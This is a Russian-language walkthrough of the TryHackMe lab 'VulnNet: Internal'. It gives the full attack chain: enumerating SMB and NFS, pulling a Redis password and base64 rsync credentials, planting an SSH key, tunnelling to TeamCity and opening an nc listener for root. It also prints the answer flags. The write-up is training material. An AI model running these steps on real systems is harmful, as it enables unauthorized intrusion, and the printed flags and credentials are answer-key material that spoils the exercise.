[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [VulnNet: Internal](https://tryhackme.com/r/room/vulnnetinternal) 

Всего 1 заданиe:
## Задание 1
VulnNet Entertainment — это компания, которая учится на своих ошибках. Они быстро поняли, что не могут создать должным образом защищенное веб-приложение, поэтому отказались от этой идеи. Вместо этого они решили настроить внутренние сервисы для деловых целей. Как обычно, вам поручено провести тест на проникновение в их сеть и сообщить о результатах.

Уровень сложности: легкий/средний
Операционная система: Linux
Эта машина была разработана как полная противоположность предыдущим машинам этой серии и фокусируется на внутренних 
сервисах. Она должна показать вам, как можно извлечь интересную информацию и использовать ее для получения доступа к 
системе. Сообщите о своих находках, отправив правильные флаги.  

Примечание: загрузка всех служб может занять от 3 до 5 минут.

Значок создан  Freepik с  сайта www.flaticon.com

### Ответьте на вопросы ниже
Что такое флаг служб? (services.txt)
```commandline
nmap -sC -sV -p- <IP>
smbclient -L <IP>
smbclient //<IP>/shares
get services.txt -
```
```commandline
THM{0a09d51e488f5fa105d8d866a497440a}
```
Что такое внутренний флаг? («внутренний флаг»)
```commandline
mkdir tmp/
sudo mount -t nfs <IP>: tmp
tree tmp 
grep -Ev "^#|^$" redis.conf
# B65Hx562F@ggAZ@F
redis-cli -h <IP> -a "B65Hx562F@ggAZ@F"
KEYS *
KEYS "internal flag"
GET "internal flag"
```
```commandline
THM{ff8e518addbbddb74531a724236a8221}
```
Что такое флаг пользователя? (user.txt)
```commandline
redis-cli -h <IP> -a "B65Hx562F@ggAZ@F"
KEYS *
GET authlist
LRANGE authlist 1 100
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
# rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
rsync --list-only rsync://<IP>
rsync --list-only rsync://rsync-connect@<IP>/files
# Hcg3HP67@TW@Bc72v
rsync --list-only rsync://rsync-connect@<IP>/files/sys-internal/
cp ~/.ssh/id_rsa.pub authorized_keys
rsync authorized_keys rsync://rsync-connect@<IP>/files/sys-internal/.ssh
ssh sys-internal@<IP>
cat user.txt
```
```commandline
THM{da7c20696831f253e0afaca8b83c07ab}
```
Что такое корневой флаг? (root.txt)
```commandline
ls -la
ss -ltp
ssh -L 8111:127.0.0.1:8111 sys-internal@<IP>
# http://localhost:8111
grep -iR token /TeamCity/logs/ 2>/dev/null
nc -nlvp 4444
cat /root/root.txt
```
```commandline
THM{e8996faea46df09dba5676dd271c60bd}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)